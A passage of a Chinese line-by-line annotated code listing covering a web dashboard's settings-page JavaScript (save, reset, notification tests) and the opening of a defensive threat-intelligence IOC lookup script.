| 152 | 函数逻辑：封装一个前端交互、请求或渲染步骤。 | `    set("allowed_origins", (el, v) => {` |
| 153 | 条件判断：根据页面状态或数据决定执行路径。 | `      if (!Array.isArray(v) \|\| !v.length) {` |
| 154 | 页面更新：修改元素内容、样式或状态。 | `        el.innerHTML = '<li class="text-tertiary">—</li>';` |
| 155 | 返回结果：把计算值交给调用方。 | `        return;` |
| 156 | 前端语句：驱动页面交互、状态管理或数据展示。 | `      }` |
| 157 | 页面更新：修改元素内容、样式或状态。 | `      el.innerHTML = v` |
| 158 | 遍历处理：逐项渲染或转换数据。 | `        .map(` |
| 159 | 函数逻辑：封装一个前端交互、请求或渲染步骤。 | `          (o) =>` |
| 160 | 前端语句：驱动页面交互、状态管理或数据展示。 | `            \`<li><code class="mono" style="color: var(--info-blue)">${escapeHtml(o)}</code></li>\`` |
| 161 | 前端语句：驱动页面交互、状态管理或数据展示。 | `        )` |
| 162 | 前端语句：驱动页面交互、状态管理或数据展示。 | `        .join("");` |
| 163 | 前端语句：驱动页面交互、状态管理或数据展示。 | `    });` |
| 164 | 前端语句：驱动页面交互、状态管理或数据展示。 | `  }` |
| 165 | 空行：分隔前端逻辑块。 | `&nbsp;` |
| 166 | 函数逻辑：封装一个前端交互、请求或渲染步骤。 | `  function fmtDuration(seconds) {` |
| 167 | 条件判断：根据页面状态或数据决定执行路径。 | `    if (seconds >= 86400) return \`${(seconds / 86400).toFixed(1)} 天\`;` |
| 168 | 条件判断：根据页面状态或数据决定执行路径。 | `    if (seconds >= 3600) return \`${(seconds / 3600).toFixed(1)} 小时\`;` |
| 169 | 条件判断：根据页面状态或数据决定执行路径。 | `    if (seconds >= 60) return \`${Math.round(seconds / 60)} 分\`;` |
| 170 | 返回结果：把计算值交给调用方。 | `    return \`${seconds} 秒\`;` |
| 171 | 前端语句：驱动页面交互、状态管理或数据展示。 | `  }` |
| 172 | 空行：分隔前端逻辑块。 | `&nbsp;` |
| 173 | 注释：说明前端逻辑或交互意图。 | `  /* =============================================================` |
| 174 | 注释：说明前端逻辑或交互意图。 | `   * 绑定输入 → 更新 current / dirty 标记` |
| 175 | 注释：说明前端逻辑或交互意图。 | `   * ============================================================= */` |
| 176 | 函数逻辑：封装一个前端交互、请求或渲染步骤。 | `  function bindInputs() {` |
| 177 | 函数逻辑：封装一个前端交互、请求或渲染步骤。 | `    Object.entries(state.schema).forEach(([key, spec]) => {` |
| 178 | 变量声明：保存 DOM、状态、配置或临时计算结果。 | `      const input = qBind(key);` |
| 179 | 条件判断：根据页面状态或数据决定执行路径。 | `      if (!input) return;` |
| 180 | 变量声明：保存 DOM、状态、配置或临时计算结果。 | `      const onChange = () => {` |
| 181 | 变量声明：保存 DOM、状态、配置或临时计算结果。 | `        const v = readInputValue(input, spec);` |
| 182 | 前端语句：驱动页面交互、状态管理或数据展示。 | `        state.current[key] = v;` |
| 183 | 变量声明：保存 DOM、状态、配置或临时计算结果。 | `        const d = qDisplay(key);` |
| 184 | 条件判断：根据页面状态或数据决定执行路径。 | `        if (d && spec.type === "float") {` |
| 185 | 页面更新：修改元素内容、样式或状态。 | `          d.textContent = Number(v).toFixed(2);` |
| 186 | 前端语句：驱动页面交互、状态管理或数据展示。 | `        }` |
| 187 | 前端语句：驱动页面交互、状态管理或数据展示。 | `        clearError(key);` |
| 188 | 前端语句：驱动页面交互、状态管理或数据展示。 | `        recomputeDirty();` |
| 189 | 前端语句：驱动页面交互、状态管理或数据展示。 | `      };` |
| 190 | 事件绑定：监听用户操作并触发对应处理函数。 | `      input.addEventListener("input", onChange);` |
| 191 | 事件绑定：监听用户操作并触发对应处理函数。 | `      input.addEventListener("change", onChange);` |
| 192 | 前端语句：驱动页面交互、状态管理或数据展示。 | `    });` |
| 193 | 前端语句：驱动页面交互、状态管理或数据展示。 | `  }` |
| 194 | 空行：分隔前端逻辑块。 | `&nbsp;` |
| 195 | 函数逻辑：封装一个前端交互、请求或渲染步骤。 | `  function readInputValue(input, spec) {` |
| 196 | 条件判断：根据页面状态或数据决定执行路径。 | `    if (spec.type === "bool") return input.checked;` |
| 197 | 条件判断：根据页面状态或数据决定执行路径。 | `    if (spec.type === "float") return parseFloat(input.value);` |
| 198 | 返回结果：把计算值交给调用方。 | `    return input.value;` |
| 199 | 前端语句：驱动页面交互、状态管理或数据展示。 | `  }` |
| 200 | 空行：分隔前端逻辑块。 | `&nbsp;` |
| 201 | 函数逻辑：封装一个前端交互、请求或渲染步骤。 | `  function recomputeDirty() {` |
| 202 | 变量声明：保存 DOM、状态、配置或临时计算结果。 | `    const d = Object.keys(state.schema).some((k) => {` |
| 203 | 变量声明：保存 DOM、状态、配置或临时计算结果。 | `      const cur = state.current[k];` |
| 204 | 变量声明：保存 DOM、状态、配置或临时计算结果。 | `      const sav = state.saved[k];` |
| 205 | 条件判断：根据页面状态或数据决定执行路径。 | `      if (state.schema[k].type === "float") {` |
| 206 | 返回结果：把计算值交给调用方。 | `        return Number(cur) !== Number(sav);` |
| 207 | 前端语句：驱动页面交互、状态管理或数据展示。 | `      }` |
| 208 | 返回结果：把计算值交给调用方。 | `      return cur !== sav;` |
| 209 | 前端语句：驱动页面交互、状态管理或数据展示。 | `    });` |
| 210 | 前端语句：驱动页面交互、状态管理或数据展示。 | `    setDirty(d);` |
| 211 | 前端语句：驱动页面交互、状态管理或数据展示。 | `  }` |
| 212 | 空行：分隔前端逻辑块。 | `&nbsp;` |
| 213 | 函数逻辑：封装一个前端交互、请求或渲染步骤。 | `  function setDirty(d) {` |
| 214 | 前端语句：驱动页面交互、状态管理或数据展示。 | `    state.dirty = d;` |
| 215 | 前端语句：驱动页面交互、状态管理或数据展示。 | `    btnSave.disabled = !d;` |
| 216 | 前端语句：驱动页面交互、状态管理或数据展示。 | `    btnReset.disabled = !d;` |
| 217 | 条件判断：根据页面状态或数据决定执行路径。 | `    if (d) setStatus("dirty", "有未保存的修改");` |
| 218 | 前端语句：驱动页面交互、状态管理或数据展示。 | `  }` |
| 219 | 空行：分隔前端逻辑块。 | `&nbsp;` |
| 220 | 注释：说明前端逻辑或交互意图。 | `  /* =============================================================` |
| 221 | 注释：说明前端逻辑或交互意图。 | `   * 保存 / 重置` |
| 222 | 注释：说明前端逻辑或交互意图。 | `   * ============================================================= */` |
| 223 | 函数逻辑：封装一个前端交互、请求或渲染步骤。 | `  function diffPayload() {` |
| 224 | 变量声明：保存 DOM、状态、配置或临时计算结果。 | `    const out = {};` |
| 225 | 函数逻辑：封装一个前端交互、请求或渲染步骤。 | `    Object.keys(state.schema).forEach((k) => {` |
| 226 | 变量声明：保存 DOM、状态、配置或临时计算结果。 | `      const cur = state.current[k];` |
| 227 | 变量声明：保存 DOM、状态、配置或临时计算结果。 | `      const sav = state.saved[k];` |
| 228 | 条件判断：根据页面状态或数据决定执行路径。 | `      if (state.schema[k].type === "float") {` |
| 229 | 条件判断：根据页面状态或数据决定执行路径。 | `        if (Number(cur) !== Number(sav)) out[k] = Number(cur);` |
| 230 | 前端语句：驱动页面交互、状态管理或数据展示。 | `      } else if (cur !== sav) {` |
| 231 | 前端语句：驱动页面交互、状态管理或数据展示。 | `        out[k] = cur;` |
| 232 | 前端语句：驱动页面交互、状态管理或数据展示。 | `      }` |
| 233 | 前端语句：驱动页面交互、状态管理或数据展示。 | `    });` |
| 234 | 返回结果：把计算值交给调用方。 | `    return out;` |
| 235 | 前端语句：驱动页面交互、状态管理或数据展示。 | `  }` |
| 236 | 空行：分隔前端逻辑块。 | `&nbsp;` |
| 237 | 函数逻辑：封装一个前端交互、请求或渲染步骤。 | `  async function save() {` |
| 238 | 变量声明：保存 DOM、状态、配置或临时计算结果。 | `    const payload = diffPayload();` |
| 239 | 条件判断：根据页面状态或数据决定执行路径。 | `    if (!Object.keys(payload).length) return;` |
| 240 | 前端语句：驱动页面交互、状态管理或数据展示。 | `    setStatus("loading", "保存中…");` |
| 241 | 前端语句：驱动页面交互、状态管理或数据展示。 | `    try {` |
| 242 | 变量声明：保存 DOM、状态、配置或临时计算结果。 | `      const result = await fetchApi("/api/settings", {` |
| 243 | 前端语句：驱动页面交互、状态管理或数据展示。 | `        method: "PUT",` |
| 244 | 前端语句：驱动页面交互、状态管理或数据展示。 | `        body: payload,` |
| 245 | 前端语句：驱动页面交互、状态管理或数据展示。 | `      });` |
| 246 | 前端语句：驱动页面交互、状态管理或数据展示。 | `      state.saved = Object.assign({}, result.editable \|\| state.saved);` |
| 247 | 前端语句：驱动页面交互、状态管理或数据展示。 | `      state.current = Object.assign({}, state.saved);` |
| 248 | 前端语句：驱动页面交互、状态管理或数据展示。 | `      applyEditableToForm(state.current);` |
| 249 | 前端语句：驱动页面交互、状态管理或数据展示。 | `      applyRuntime(result.runtime \|\| {});` |
| 250 | 前端语句：驱动页面交互、状态管理或数据展示。 | `      setDirty(false);` |
| 251 | 前端语句：驱动页面交互、状态管理或数据展示。 | `      toast(` |
| 252 | 前端语句：驱动页面交互、状态管理或数据展示。 | `        "已保存：" + (result.updated_keys \|\| []).join(", "),` |
| 253 | 前端语句：驱动页面交互、状态管理或数据展示。 | `        "info"` |
| 254 | 前端语句：驱动页面交互、状态管理或数据展示。 | `      );` |
| 255 | 前端语句：驱动页面交互、状态管理或数据展示。 | `      setStatus("saved", "已保存");` |
| 256 | 前端语句：驱动页面交互、状态管理或数据展示。 | `    } catch (err) {` |
| 257 | 注释：说明前端逻辑或交互意图。 | `      // 后端 400 带 errors` |
| 258 | 变量声明：保存 DOM、状态、配置或临时计算结果。 | `      const payload = err.payload \|\| {};` |
| 259 | 变量声明：保存 DOM、状态、配置或临时计算结果。 | `      const errs = payload.errors;` |
| 260 | 条件判断：根据页面状态或数据决定执行路径。 | `      if (errs && typeof errs === "object") {` |
| 261 | 函数逻辑：封装一个前端交互、请求或渲染步骤。 | `        Object.entries(errs).forEach(([k, m]) => setError(k, String(m)));` |
| 262 | 前端语句：驱动页面交互、状态管理或数据展示。 | `        setStatus("err", "部分字段未通过校验");` |
| 263 | 前端语句：驱动页面交互、状态管理或数据展示。 | `      } else {` |
| 264 | 前端语句：驱动页面交互、状态管理或数据展示。 | `        toast("保存失败：" + (err.message \|\| ""), "error");` |
| 265 | 前端语句：驱动页面交互、状态管理或数据展示。 | `        setStatus("err", err.message \|\| "保存失败");` |
| 266 | 前端语句：驱动页面交互、状态管理或数据展示。 | `      }` |
| 267 | 前端语句：驱动页面交互、状态管理或数据展示。 | `    }` |
| 268 | 前端语句：驱动页面交互、状态管理或数据展示。 | `  }` |
| 269 | 空行：分隔前端逻辑块。 | `&nbsp;` |
| 270 | 函数逻辑：封装一个前端交互、请求或渲染步骤。 | `  function resetToSaved() {` |
| 271 | 前端语句：驱动页面交互、状态管理或数据展示。 | `    state.current = Object.assign({}, state.saved);` |
| 272 | 前端语句：驱动页面交互、状态管理或数据展示。 | `    applyEditableToForm(state.current);` |
| 273 | 前端语句：驱动页面交互、状态管理或数据展示。 | `    setDirty(false);` |
| 274 | 前端语句：驱动页面交互、状态管理或数据展示。 | `    setStatus("saved", "已回到已保存的配置");` |
| 275 | 前端语句：驱动页面交互、状态管理或数据展示。 | `  }` |
| 276 | 空行：分隔前端逻辑块。 | `&nbsp;` |
| 277 | 注释：说明前端逻辑或交互意图。 | `  /* =============================================================` |
| 278 | 注释：说明前端逻辑或交互意图。 | `   * 错误处理 & 状态展示` |
| 279 | 注释：说明前端逻辑或交互意图。 | `   * ============================================================= */` |
| 280 | 函数逻辑：封装一个前端交互、请求或渲染步骤。 | `  function setError(field, msg) {` |
| 281 | 变量声明：保存 DOM、状态、配置或临时计算结果。 | `    const node = qError(field);` |
| 282 | 页面更新：修改元素内容、样式或状态。 | `    if (node) node.textContent = msg;` |
| 283 | 前端语句：驱动页面交互、状态管理或数据展示。 | `  }` |
| 284 | 函数逻辑：封装一个前端交互、请求或渲染步骤。 | `  function clearError(field) {` |
| 285 | 变量声明：保存 DOM、状态、配置或临时计算结果。 | `    const node = qError(field);` |
| 286 | 页面更新：修改元素内容、样式或状态。 | `    if (node) node.textContent = "";` |
| 287 | 前端语句：驱动页面交互、状态管理或数据展示。 | `  }` |
| 288 | 函数逻辑：封装一个前端交互、请求或渲染步骤。 | `  function setStatus(kind, msg) {` |
| 289 | 条件判断：根据页面状态或数据决定执行路径。 | `    if (!statusEl \|\| !statusText) return;` |
| 290 | 页面更新：修改元素内容、样式或状态。 | `    statusText.textContent = msg;` |
| 291 | 页面更新：修改元素内容、样式或状态。 | `    statusEl.classList.toggle("settings-actions__status--dirty", kind === "dirty");` |
| 292 | 页面更新：修改元素内容、样式或状态。 | `    statusEl.classList.toggle("settings-actions__status--saved", kind === "saved");` |
| 293 | 前端语句：驱动页面交互、状态管理或数据展示。 | `  }` |
| 294 | 空行：分隔前端逻辑块。 | `&nbsp;` |
| 295 | 注释：说明前端逻辑或交互意图。 | `  /* =============================================================` |
| 296 | 注释：说明前端逻辑或交互意图。 | `   * 通知测试` |
| 297 | 注释：说明前端逻辑或交互意图。 | `   * ============================================================= */` |
| 298 | 函数逻辑：封装一个前端交互、请求或渲染步骤。 | `  function bindTests() {` |
| 299 | 函数逻辑：封装一个前端交互、请求或渲染步骤。 | `    document.querySelectorAll("[data-test]").forEach((btn) => {` |
| 300 | 函数逻辑：封装一个前端交互、请求或渲染步骤。 | `      btn.addEventListener("click", async () => {` |
| 301 | 变量声明：保存 DOM、状态、配置或临时计算结果。 | `        const kind = btn.dataset.test;` |
| 302 | 变量声明：保存 DOM、状态、配置或临时计算结果。 | `        const resultNode = document.querySelector(` |
| 303 | 前端语句：驱动页面交互、状态管理或数据展示。 | `          \`[data-test-result="${kind}"]\`` |
| 304 | 前端语句：驱动页面交互、状态管理或数据展示。 | `        );` |
| 305 | 条件判断：根据页面状态或数据决定执行路径。 | `        if (resultNode) {` |
| 306 | 页面更新：修改元素内容、样式或状态。 | `          resultNode.textContent = "测试中…";` |
| 307 | 前端语句：驱动页面交互、状态管理或数据展示。 | `          resultNode.className = "settings-test-result";` |
| 308 | 前端语句：驱动页面交互、状态管理或数据展示。 | `        }` |
| 309 | 前端语句：驱动页面交互、状态管理或数据展示。 | `        btn.disabled = true;` |
| 310 | 前端语句：驱动页面交互、状态管理或数据展示。 | `        try {` |
| 311 | 条件判断：根据页面状态或数据决定执行路径。 | `          if (kind === "webhook") {` |
| 312 | 变量声明：保存 DOM、状态、配置或临时计算结果。 | `            const val = qBind("alert_webhook").value.trim();` |
| 313 | 变量声明：保存 DOM、状态、配置或临时计算结果。 | `            const resp = await fetchApi("/api/settings/test_webhook", {` |
| 314 | 前端语句：驱动页面交互、状态管理或数据展示。 | `              method: "POST",` |
| 315 | 前端语句：驱动页面交互、状态管理或数据展示。 | `              body: val ? { url: val } : {},` |
| 316 | 前端语句：驱动页面交互、状态管理或数据展示。 | `            });` |
| 317 | 前端语句：驱动页面交互、状态管理或数据展示。 | `            renderTestResult(resultNode, resp, "webhook");` |
| 318 | 前端语句：驱动页面交互、状态管理或数据展示。 | `          } else if (kind === "email") {` |
| 319 | 变量声明：保存 DOM、状态、配置或临时计算结果。 | `            const val = qBind("alert_email").value.trim();` |
| 320 | 变量声明：保存 DOM、状态、配置或临时计算结果。 | `            const resp = await fetchApi("/api/settings/test_email", {` |
| 321 | 前端语句：驱动页面交互、状态管理或数据展示。 | `              method: "POST",` |
| 322 | 前端语句：驱动页面交互、状态管理或数据展示。 | `              body: val ? { email: val } : {},` |
| 323 | 前端语句：驱动页面交互、状态管理或数据展示。 | `            });` |
| 324 | 前端语句：驱动页面交互、状态管理或数据展示。 | `            renderTestResult(resultNode, resp, "email");` |
| 325 | 前端语句：驱动页面交互、状态管理或数据展示。 | `          }` |
| 326 | 前端语句：驱动页面交互、状态管理或数据展示。 | `        } catch (err) {` |
| 327 | 条件判断：根据页面状态或数据决定执行路径。 | `          if (resultNode) {` |
| 328 | 页面更新：修改元素内容、样式或状态。 | `            resultNode.textContent = "测试失败：" + (err.message \|\| "");` |
| 329 | 前端语句：驱动页面交互、状态管理或数据展示。 | `            resultNode.className = "settings-test-result settings-test-result--err";` |
| 330 | 前端语句：驱动页面交互、状态管理或数据展示。 | `          }` |
| 331 | 前端语句：驱动页面交互、状态管理或数据展示。 | `        } finally {` |
| 332 | 前端语句：驱动页面交互、状态管理或数据展示。 | `          btn.disabled = false;` |
| 333 | 前端语句：驱动页面交互、状态管理或数据展示。 | `        }` |
| 334 | 前端语句：驱动页面交互、状态管理或数据展示。 | `      });` |
| 335 | 前端语句：驱动页面交互、状态管理或数据展示。 | `    });` |
| 336 | 前端语句：驱动页面交互、状态管理或数据展示。 | `  }` |
| 337 | 空行：分隔前端逻辑块。 | `&nbsp;` |
| 338 | 函数逻辑：封装一个前端交互、请求或渲染步骤。 | `  function renderTestResult(node, resp, kind) {` |
| 339 | 条件判断：根据页面状态或数据决定执行路径。 | `    if (!node) return;` |
| 340 | 条件判断：根据页面状态或数据决定执行路径。 | `    if (resp.ok) {` |
| 341 | 变量声明：保存 DOM、状态、配置或临时计算结果。 | `      const parts = [];` |
| 342 | 条件判断：根据页面状态或数据决定执行路径。 | `      if (kind === "webhook") {` |
| 343 | 条件判断：根据页面状态或数据决定执行路径。 | `        if (resp.status_code !== undefined) parts.push("HTTP " + resp.status_code);` |
| 344 | 条件判断：根据页面状态或数据决定执行路径。 | `        if (resp.latency_ms !== undefined) parts.push(resp.latency_ms + " ms");` |
| 345 | 页面更新：修改元素内容、样式或状态。 | `        node.textContent = "✓ 试投成功 · " + parts.join(" · ");` |
| 346 | 前端语句：驱动页面交互、状态管理或数据展示。 | `      } else {` |
| 347 | 页面更新：修改元素内容、样式或状态。 | `        node.textContent = "✓ " + (resp.note \|\| "测试通过");` |
| 348 | 前端语句：驱动页面交互、状态管理或数据展示。 | `      }` |
| 349 | 前端语句：驱动页面交互、状态管理或数据展示。 | `      node.className = "settings-test-result settings-test-result--ok";` |
| 350 | 前端语句：驱动页面交互、状态管理或数据展示。 | `    } else {` |
| 351 | 变量声明：保存 DOM、状态、配置或临时计算结果。 | `      const mapped = {` |
| 352 | 前端语句：驱动页面交互、状态管理或数据展示。 | `        empty: "未配置值",` |
| 353 | 前端语句：驱动页面交互、状态管理或数据展示。 | `        invalid_email_format: "邮箱格式不合法",` |
| 354 | 前端语句：驱动页面交互、状态管理或数据展示。 | `        timeout: "请求超时",` |
| 355 | 前端语句：驱动页面交互、状态管理或数据展示。 | `        request_error: "请求失败",` |
| 356 | 前端语句：驱动页面交互、状态管理或数据展示。 | `      };` |
| 357 | 页面更新：修改元素内容、样式或状态。 | `      node.textContent =` |
| 358 | 前端语句：驱动页面交互、状态管理或数据展示。 | `        "× " +` |
| 359 | 前端语句：驱动页面交互、状态管理或数据展示。 | `        (mapped[resp.reason] \|\| resp.reason \|\| "测试未通过") +` |
| 360 | 前端语句：驱动页面交互、状态管理或数据展示。 | `        (resp.detail ? " (" + resp.detail + ")" : "");` |
| 361 | 前端语句：驱动页面交互、状态管理或数据展示。 | `      node.className = "settings-test-result settings-test-result--err";` |
| 362 | 前端语句：驱动页面交互、状态管理或数据展示。 | `    }` |
| 363 | 前端语句：驱动页面交互、状态管理或数据展示。 | `  }` |
| 364 | 空行：分隔前端逻辑块。 | `&nbsp;` |
| 365 | 注释：说明前端逻辑或交互意图。 | `  /* =============================================================` |
| 366 | 注释：说明前端逻辑或交互意图。 | `   * 启动` |
| 367 | 注释：说明前端逻辑或交互意图。 | `   * ============================================================= */` |
| 368 | 函数逻辑：封装一个前端交互、请求或渲染步骤。 | `  async function init() {` |
| 369 | 前端语句：驱动页面交互、状态管理或数据展示。 | `    bindInputs();` |
| 370 | 前端语句：驱动页面交互、状态管理或数据展示。 | `    bindTests();` |
| 371 | 事件绑定：监听用户操作并触发对应处理函数。 | `    btnSave.addEventListener("click", save);` |
| 372 | 事件绑定：监听用户操作并触发对应处理函数。 | `    btnReset.addEventListener("click", resetToSaved);` |
| 373 | 空行：分隔前端逻辑块。 | `&nbsp;` |
| 374 | 前端语句：驱动页面交互、状态管理或数据展示。 | `    await loadSnapshot();` |
| 375 | 空行：分隔前端逻辑块。 | `&nbsp;` |
| 376 | 变量声明：保存 DOM、状态、配置或临时计算结果。 | `    const shell = document.getElementById("settings-shell");` |
| 377 | 条件判断：根据页面状态或数据决定执行路径。 | `    if (shell) shell.setAttribute("aria-busy", "false");` |
| 378 | 前端语句：驱动页面交互、状态管理或数据展示。 | `  }` |
| 379 | 空行：分隔前端逻辑块。 | `&nbsp;` |
| 380 | 条件判断：根据页面状态或数据决定执行路径。 | `  if (document.readyState === "loading") {` |
| 381 | 事件绑定：监听用户操作并触发对应处理函数。 | `    document.addEventListener("DOMContentLoaded", init);` |
| 382 | 前端语句：驱动页面交互、状态管理或数据展示。 | `  } else {` |
| 383 | 前端语句：驱动页面交互、状态管理或数据展示。 | `    init();` |
| 384 | 前端语句：驱动页面交互、状态管理或数据展示。 | `  }` |
| 385 | 前端语句：驱动页面交互、状态管理或数据展示。 | `})();` |

## `web/static/js/threat_intel.js`

- 类型：前端静态资源
- 行数：628

| 行号 | 备注 | 原始代码 |
|---:|---|---|
| 1 | 注释：说明前端逻辑或交互意图。 | `/*` |
| 2 | 注释：说明前端逻辑或交互意图。 | ` * threat_intel.js — 威胁情报控制器（Phase 7）` |
| 3 | 注释：说明前端逻辑或交互意图。 | ` *` |
| 4 | 注释：说明前端逻辑或交互意图。 | ` * 职责：` |
| 5 | 注释：说明前端逻辑或交互意图。 | ` *   1. 加载 providers 状态 → 未配置的 provider 显示为 disabled` |
| 6 | 注释：说明前端逻辑或交互意图。 | ` *   2. 查询面板：并行查询本地 / AbuseIPDB / VirusTotal（带 mock 标识）` |
| 7 | 注释：说明前端逻辑或交互意图。 | ` *   3. IOC 列表：类型 / 来源 / 搜索筛选；行内删除` |
| 8 | 注释：说明前端逻辑或交互意图。 | ` *   4. 新增 IOC 抽屉：前端基础校验，后端二次校验` |
| 9 | 注释：说明前端逻辑或交互意图。 | ` */` |
| 10 | 前端语句：驱动页面交互、状态管理或数据展示。 | `(function () {` |
| 11 | 前端语句：驱动页面交互、状态管理或数据展示。 | `  "use strict";` |
| 12 | 空行：分隔前端逻辑块。 | `&nbsp;` |
| 13 | 条件判断：根据页面状态或数据决定执行路径。 | `  if (!window.AGApi) return;` |
| 14 | 变量声明：保存 DOM、状态、配置或临时计算结果。 | `  const { fetchApi } = window.AGApi;` |
| 15 | 变量声明：保存 DOM、状态、配置或临时计算结果。 | `  const { escapeHtml, formatTime, toast } = window.AGUI;` |
| 16 | 空行：分隔前端逻辑块。 | `&nbsp;` |
| 17 | 变量声明：保存 DOM、状态、配置或临时计算结果。 | `  const IOC_TYPES = ["ip", "domain"];` |
| 18 | 变量声明：保存 DOM、状态、配置或临时计算结果。 | `  const IP_RE = /^(?:\d{1,3}\.){3}\d{1,3}$/;` |
| 19 | 变量声明：保存 DOM、状态、配置或临时计算结果。 | `  const DOMAIN_RE =` |
| 20 | 前端语句：驱动页面交互、状态管理或数据展示。 | `    /^(?=.{1,253}$)(?:[a-zA-Z0-9](?:[a-zA-Z0-9-]{0,61}[a-zA-Z0-9])?\.)+[a-zA-Z]{2,}$/;` |
| 21 | 空行：分隔前端逻辑块。 | `&nbsp;` |
| 22 | 注释：说明前端逻辑或交互意图。 | `  /* =============================================================` |
| 23 | 注释：说明前端逻辑或交互意图。 | `   * 状态` |
| 24 | 注释：说明前端逻辑或交互意图。 | `   * ============================================================= */` |
| 25 | 变量声明：保存 DOM、状态、配置或临时计算结果。 | `  const state = {` |
| 26 | 前端语句：驱动页面交互、状态管理或数据展示。 | `    queryType: "ip",` |
| 27 | 前端语句：驱动页面交互、状态管理或数据展示。 | `    filter: { type: "", source: "", q: "" },` |
| 28 | 前端语句：驱动页面交互、状态管理或数据展示。 | `    providers: {` |
| 29 | 前端语句：驱动页面交互、状态管理或数据展示。 | `      local: { enabled: true, configured: true, mock: false },` |
| 30 | 前端语句：驱动页面交互、状态管理或数据展示。 | `      abuseipdb: { enabled: false, configured: false, mock: false },` |
| 31 | 前端语句：驱动页面交互、状态管理或数据展示。 | `      virustotal: { enabled: false, configured: false, mock: false },` |
| 32 | 前端语句：驱动页面交互、状态管理或数据展示。 | `    },` |
| 33 | 前端语句：驱动页面交互、状态管理或数据展示。 | `    iocs: [],` |
| 34 | 前端语句：驱动页面交互、状态管理或数据展示。 | `  };` |
| 35 | 空行：分隔前端逻辑块。 | `&nbsp;` |
| 36 | 注释：说明前端逻辑或交互意图。 | `  /* =============================================================` |
| 37 | 注释：说明前端逻辑或交互意图。 | `   * DOM` |
| 38 | 注释：说明前端逻辑或交互意图。 | `   * ============================================================= */` |
| 39 | 变量声明：保存 DOM、状态、配置或临时计算结果。 | `  const el = {` |
| 40 | DOM 查询：定位页面元素以便读取或更新。 | `    countTotal: document.getElementById("count-total"),` |
| 41 | DOM 查询：定位页面元素以便读取或更新。 | `    countIp: document.getElementById("count-ip"),` |
| 42 | DOM 查询：定位页面元素以便读取或更新。 | `    countDomain: document.getElementById("count-domain"),` |
| 43 | DOM 查询：定位页面元素以便读取或更新。 | `    providerStatus: document.getElementById("provider-status"),` |
| 44 | 空行：分隔前端逻辑块。 | `&nbsp;` |
| 45 | DOM 查询：定位页面元素以便读取或更新。 | `    btnQueryTypes: document.querySelectorAll("[data-query-type]"),` |
| 46 | DOM 查询：定位页面元素以便读取或更新。 | `    qValue: document.getElementById("q-value"),` |
| 47 | DOM 查询：定位页面元素以便读取或更新。 | `    btnQuery: document.getElementById("btn-query"),` |
| 48 | DOM 查询：定位页面元素以便读取或更新。 | `    btnQueryClear: document.getElementById("btn-query-clear"),` |
| 49 | DOM 查询：定位页面元素以便读取或更新。 | `    verdict: document.getElementById("query-verdict"),` |
| 50 | DOM 查询：定位页面元素以便读取或更新。 | `    verdictStatus: document.getElementById("verdict-status"),` |
| 51 | DOM 查询：定位页面元素以便读取或更新。 | `    verdictDetail: document.getElementById("verdict-detail"),` |
| 52 | DOM 查询：定位页面元素以便读取或更新。 | `    verdictValue: document.getElementById("verdict-value"),` |
| 53 | DOM 查询：定位页面元素以便读取或更新。 | `    providerGrid: document.getElementById("provider-grid"),` |
| 54 | 空行：分隔前端逻辑块。 | `&nbsp;` |
| 55 | DOM 查询：定位页面元素以便读取或更新。 | `    btnListTypes: document.querySelectorAll("[data-list-type]"),` |
| 56 | DOM 查询：定位页面元素以便读取或更新。 | `    selSource: document.getElementById("filter-source"),` |
| 57 | DOM 查询：定位页面元素以便读取或更新。 | `    inputListQ: document.getElementById("filter-q"),` |
| 58 | DOM 查询：定位页面元素以便读取或更新。 | `    listStatus: document.getElementById("list-status"),` |
| 59 | DOM 查询：定位页面元素以便读取或更新。 | `    tbody: document.getElementById("iocs-tbody"),` |
| 60 | 空行：分隔前端逻辑块。 | `&nbsp;` |
| 61 | DOM 查询：定位页面元素以便读取或更新。 | `    btnNew: document.getElementById("btn-new-ioc"),` |
| 62 | DOM 查询：定位页面元素以便读取或更新。 | `    btnRefresh: document.getElementById("btn-refresh"),` |
| 63 | DOM 查询：定位页面元素以便读取或更新。 | `    btnSeed: document.getElementById("btn-seed"),` |
| 64 | 空行：分隔前端逻辑块。 | `&nbsp;` |
| 65 | DOM 查询：定位页面元素以便读取或更新。 | `    drawer: document.getElementById("ioc-drawer"),` |
| 66 | DOM 查询：定位页面元素以便读取或更新。 | `    drawerOverlay: document.getElementById("drawer-overlay"),` |
| 67 | DOM 查询：定位页面元素以便读取或更新。 | `    drawerClose: document.getElementById("drawer-close"),` |
| 68 | DOM 查询：定位页面元素以便读取或更新。 | `    fType: document.getElementById("f-type"),` |
| 69 | DOM 查询：定位页面元素以便读取或更新。 | `    fValue: document.getElementById("f-value"),` |
| 70 | DOM 查询：定位页面元素以便读取或更新。 | `    eValue: document.getElementById("e-value"),` |
| 71 | DOM 查询：定位页面元素以便读取或更新。 | `    fSource: document.getElementById("f-source"),` |
| 72 | DOM 查询：定位页面元素以便读取或更新。 | `    fScore: document.getElementById("f-score"),` |
| 73 | DOM 查询：定位页面元素以便读取或更新。 | `    fReason: document.getElementById("f-reason"),` |
| 74 | DOM 查询：定位页面元素以便读取或更新。 | `    fNote: document.getElementById("f-note"),` |
| 75 | DOM 查询：定位页面元素以便读取或更新。 | `    btnSave: document.getElementById("btn-drawer-save"),` |
| 76 | DOM 查询：定位页面元素以便读取或更新。 | `    btnCancel: document.getElementById("btn-drawer-cancel"),` |
| 77 | 前端语句：驱动页面交互、状态管理或数据展示。 | `  };` |
| 78 | 空行：分隔前端逻辑块。 | `&nbsp;` |
| 79 | 注释：说明前端逻辑或交互意图。 | `  /* =============================================================` |
| 80 | 注释：说明前端逻辑或交互意图。 | `   * 工具` |
| 81 | 注释：说明前端逻辑或交互意图。 | `   * ============================================================= */` |
| 82 | 函数逻辑：封装一个前端交互、请求或渲染步骤。 | `  function debounce(fn, wait) {` |
| 83 | 变量声明：保存 DOM、状态、配置或临时计算结果。 | `    let t = null;` |
| 84 | 返回结果：把计算值交给调用方。 | `    return function debounced(...args) {` |
| 85 | 前端语句：驱动页面交互、状态管理或数据展示。 | `      clearTimeout(t);` |
| 86 | 函数逻辑：封装一个前端交互、请求或渲染步骤。 | `      t = setTimeout(() => fn.apply(null, args), wait);` |
| 87 | 前端语句：驱动页面交互、状态管理或数据展示。 | `    };` |
| 88 | 前端语句：驱动页面交互、状态管理或数据展示。 | `  }` |
| 89 | 空行：分隔前端逻辑块。 | `&nbsp;` |
| 90 | 函数逻辑：封装一个前端交互、请求或渲染步骤。 | `  function validateValue(type, value) {` |
| 91 | 条件判断：根据页面状态或数据决定执行路径。 | `    if (!value) return "请输入 IOC 值";` |
